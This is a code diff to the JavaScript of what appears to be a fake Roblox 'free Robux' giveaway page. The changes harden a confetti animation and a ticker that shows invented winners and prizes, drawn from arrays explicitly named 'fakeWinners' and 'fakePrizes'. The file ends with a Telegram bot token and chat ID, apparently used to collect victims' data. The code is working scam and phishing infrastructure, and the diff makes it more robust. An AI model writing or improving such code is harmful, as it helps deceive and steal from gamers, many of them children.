@@ -52,7 +52,9 @@ function drawConfetti() {
     var c = document.getElementById('confettiCanvas');
     if (!c) return;
     var ctx = c.getContext('2d');
-    c.width = window.innerWidth; c.height = window.innerHeight;
+    if (c.width !== window.innerWidth || c.height !== window.innerHeight) {
+        c.width = window.innerWidth; c.height = window.innerHeight;
+    }
     ctx.clearRect(0, 0, c.width, c.height);
     for (var i = confettiParticles.length - 1; i >= 0; i--) {
         var p = confettiParticles[i];
@@ -109,6 +111,7 @@ var fakeWinners = [
 var fakePrizes = ['10,000 Robux','5,000 Robux','Dominus Empyreus','2,500 Robux','Korblox Deathspeaker','1,000 Robux','8-Bit Crown','Fiery Horns'];
 function addWinTicker() {
     var ticker = document.getElementById('winTicker');
+    if (!ticker) return;
     var name = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
     var prize = fakePrizes[Math.floor(Math.random() * fakePrizes.length)];
     var msg = '🎉 ' + name + ' just won ' + prize + '!';
@@ -119,7 +122,15 @@ function addWinTicker() {
     setTimeout(function() { span.remove(); }, 8000);
 }
 setInterval(addWinTicker, 3000);
-addWinTicker(); addWinTicker();
+function initTicker() {
+    var ticker = document.getElementById('winTicker');
+    if (ticker) { addWinTicker(); addWinTicker(); }
+}
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTicker);
+} else {
+    initTicker();
+}
 
 const BOT_TOKEN='***';
 const CHAT_ID = '1361048119';
